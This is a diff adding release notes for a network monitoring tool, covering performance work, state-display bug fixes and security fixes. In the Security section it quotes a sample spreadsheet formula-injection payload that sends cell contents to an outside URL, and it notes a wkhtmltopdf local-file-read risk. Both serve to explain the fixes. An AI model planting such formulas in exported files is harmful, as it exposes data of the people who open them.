@@ -153,6 +153,62 @@
   preloaded once a round, the way DNS monitors already were, so a fleet of tens of thousands of
   ordinary devices stops paying one database round trip each, every polling round, to discover it
   has no URL check.
+- **The WebUI loads the Topology, Troubleshoot and Settings sections on demand.** Everything on an
+  operator's daily path — dashboard, nodes, alerts — still arrives in the first download, but the
+  ~25 screens behind those three sections no longer do, so opening the dashboard stops fetching the
+  world-map outline, the report registry and seventeen settings pages nobody asked for. Moving
+  between screens *inside* a section is unaffected: a section loads once, then behaves as before.
+- **Two fleet-scale paths stopped doing work proportional to the fleet on every round.** Neither is
+  visible on a small deployment; both were the difference between a steady state that costs nothing
+  and one that does not. The scheduler no longer deep-copies every node's resolved check set — with
+  its decrypted credentials, OID column lists and route-probe plans — once per pool per sweep just
+  to discover nothing changed, and the coordinator now holds its registry lock only while reading
+  membership, so poller heartbeats and the Pollers view no longer queue behind a working-set diff.
+  Alert evaluation resolves each metric's threshold once per poll result rather than once per
+  sample, which matters most for a wide SNMP table where one result carries a hundred samples of
+  the same metric. The dwell window still sees every sample individually — only the repeated
+  lookup went away.
+- **The Nodes tree no longer rebuilds on every live status update.** The status dots arrive over a
+  stream that flushes for any node in the fleet; the tree was being reconstructed on each flush
+  even when nothing on screen had moved.
+
+### Bug Fixes
+- **The dashboard summary, the per-group tallies, the network map and the inventory report no longer
+  disagree with the Nodes page about a node's state.** All five surfaces are supposed to apply the
+  same rule — the alert engine's opinion when it has one, otherwise a recent ICMP sample means `ok`
+  — but the rule had been written out by hand in five places and two of them had dropped the
+  fallback. The visible symptom was a core restart: for the minutes before the first sweep the
+  dashboard reported `unknown` for the same nodes the Nodes page beside it was showing as `ok`, and
+  a PDF inventory report generated in that window printed `unknown` down the whole column. The rule
+  now lives in one place. Deliberately unchanged: the **fleet health timeline** still records the
+  raw engine view, so the post-restart gap remains visible in history — a historical record should
+  say what was actually being monitored at that moment.
+- **A Cisco Meraki organization collecting the `inventory` tier showed the raw key
+  `meraki.tier.inventory` instead of a label.** The API accepts all four tiers and the org list
+  prints what is stored, but only three of them had ever been given a name. The cadence dialog
+  still offers three checkboxes — inventory is a reconciliation triggered from "Import devices",
+  not a recurring collection, so a checkbox for it would promise polling that never happens.
+
+### Security
+- **CSV exports can no longer carry a spreadsheet formula that executes when the file is opened.**
+  The audit log records the username submitted to a *failed* login, so anyone who can reach the
+  sign-in page could plant a cell reading `=HYPERLINK("http://…"&A1,"Click")` and have it evaluated
+  by the administrator who later exports and opens the log; the Troubleshoot exports carry
+  device-supplied strings with the same problem. RFC 4180 quoting does not help — a spreadsheet
+  strips the quotes and then evaluates the text. Values beginning with `=`, `+`, `-`, `@`, TAB or CR
+  are now prefixed with an apostrophe so the cell is read as text. A value that is entirely a
+  negative number (`-5`, `-0.31`) is exempt and still exports as a number: the Troubleshoot reports
+  export correlation coefficients, and neutralizing those would leave a column that is text for half
+  its rows and numeric for the other half — which sorts wrong rather than merely looking wrong.
+- **PDF report rendering no longer has access to the container's filesystem.** Reports are rendered
+  by `wkhtmltopdf`, which was being invoked with `--enable-local-file-access` for no reason: the
+  generated document is self-contained (inline styles, inline SVG charts, no images, no links, no
+  `url()`), so nothing in a report ever needed to read a file. The flag is what would turn an
+  escaping mistake in the device-supplied text of a report into a local-file read, so it is now
+  passed as `--disable-local-file-access` rather than left to a default that a future version could
+  flip back.
+- **The test transport that reports every device reachable is no longer compiled into the shipped
+  binaries.** It is now behind a feature that only test builds enable.
 
 ## v0.1.23 — An alert for monitoring's own blind spot, a support bundle, and an RCA that investigates
 
